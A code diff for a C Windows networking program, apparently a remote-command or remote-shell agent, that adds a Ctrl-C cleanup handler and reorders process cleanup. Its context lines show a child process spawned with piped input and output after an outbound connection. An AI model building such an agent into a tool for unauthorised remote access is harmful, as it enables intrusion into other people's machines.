@@ -21,6 +21,21 @@ int HeartBeat(SOCKET s){
     return iResult;
 }
 
+SOCKET* __sock_TCP = NULL;
+SOCKET* __sock_UDP = NULL;
+PROCESS_INFORMATION* __child = NULL;
+
+void HandleCTRL_C(int sg){
+    if (__sock_TCP && (*__sock_TCP != INVALID_SOCKET))
+        closesocket(*__sock_TCP);
+    if (__sock_UDP && (*__sock_UDP != INVALID_SOCKET))
+        closesocket(*__sock_UDP);
+    if (__child)
+        TerminateProcess(__child->hProcess, 0);
+    exit(0);
+
+}
+
 int __cdecl main(int argc, char **argv)
 {
     int iResult, sig;
@@ -29,6 +44,13 @@ int __cdecl main(int argc, char **argv)
     SOCKET sock = INVALID_SOCKET;
     SOCKET socku = INVALID_SOCKET;
     struct sockaddr_in ad_info;
+    PROCESS_INFORMATION pi;
+    HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
+    __sock_TCP = &sock;
+    __sock_UDP = &socku;
+    __child = &pi;
+    signal (SIGINT, HandleCTRL_C);
+
     iResult = InitSetup();
     if (iResult < 0){
         return 1;
@@ -76,7 +98,6 @@ int __cdecl main(int argc, char **argv)
                 if (iResult < 0){
                     perror("failed at connecting");
                 }
-                HANDLE hStdinRd, hStdinWr, hStdoutRd, hStdoutWr;
                 SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
 
                 // Create pipes for the child process's standard input and output.
@@ -88,7 +109,6 @@ int __cdecl main(int argc, char **argv)
                 }
                 sa.bInheritHandle = TRUE;
                 STARTUPINFO si = { sizeof(STARTUPINFO) };
-                PROCESS_INFORMATION pi;
                 si.dwFlags = STARTF_USESTDHANDLES;
                 si.hStdInput = hStdinRd;
                 si.hStdOutput = hStdoutWr;
@@ -121,9 +141,9 @@ int __cdecl main(int argc, char **argv)
                 }
                 CloseHandle(hStdoutRd);
                 CloseHandle(hStdinWr);
+                TerminateProcess(pi.hProcess, 0);
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
-                TerminateProcess(pi.hProcess, 0);
                 closesocket(sock);
                 break;
             case 0x3:
